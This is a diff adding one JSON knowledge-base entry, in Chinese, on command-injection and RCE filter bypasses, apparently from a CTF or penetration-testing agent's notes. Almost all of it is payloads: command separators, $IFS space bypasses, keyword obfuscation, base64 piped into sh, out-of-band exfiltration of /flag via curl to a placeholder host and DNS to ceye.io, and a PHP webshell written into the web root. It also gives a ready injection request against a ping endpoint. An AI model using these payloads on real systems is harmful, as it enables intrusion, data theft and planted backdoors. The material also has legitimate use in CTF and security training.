@@ -1,0 +1,16 @@
+{
+  "id": "kb007",
+  "title": "命令注入与 RCE 绕过",
+  "description": "无回显走外带，关键字用变量拼接",
+  "detail": "分隔符：; | || && 换行 $( ) 反引号\n空格绕过：$IFS $IFS$9 <重定向 %09\n关键字绕过：ca${x}t、拼接 c'a't、base64: echo Y2F0IC9mbGFn|base64 -d|sh\n无回显：curl http://MY/`cat /flag|base64`、dns 外带 `cat /flag`.xxx.ceye.io\n写 shell：echo PD9waHAg... | base64 -d > /var/www/html/x.php\n验证后立刻 loot fact 记 payload + 路径。",
+  "commands": [
+    "curl 'http://T/ping?ip=127.0.0.1%0acat%20/flag'"
+  ],
+  "tags": [
+    "web",
+    "rce",
+    "cmd"
+  ],
+  "source": "经验",
+  "created_at": "2026-10-15T13:44:05Z"
+}
